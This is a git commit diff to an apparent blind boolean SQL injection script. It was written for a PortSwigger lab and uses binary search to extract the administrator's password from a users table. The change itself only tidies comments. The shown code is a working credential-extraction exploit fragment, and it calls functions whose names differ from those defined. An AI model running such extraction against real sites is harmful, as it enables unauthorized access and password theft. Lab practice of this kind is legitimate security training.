b2cd802f4a8782c31fc444716dca100ba77f2538
PK <136787670+H4ck3rxPK@users.noreply.github.com>
2025-05-17 09:50:53 +0800

    Update SQLM0US3_Boolean.py

--- SQLM0US3_Boolean.py
+++ SQLM0US3_Boolean.py
@@ -17,7 +17,7 @@ def oracle(q):
     response = requests.get(url(),cookies=cookies)
     return "Welcome back!" in response.text
 
-#Calculate the Length
+# Calculate the Length
 def dumpNumber(q):
     low = 0
     high = 127
@@ -29,7 +29,7 @@ def dumpNumber(q):
             low = mid + 1
     return low
 
-#dumping
+# dumping string
 def dumpString(q, length):
     val = ""
     for i in range(1, length+1):
@@ -40,6 +40,7 @@ def dumpString(q, length):
         val += chr(c)
     return val
 
+#for portswigger lab
 length=dump_length("password")
 print(length)
 print(dump_string("SELECT password FROM users WHERE username = 'administrator'", length))
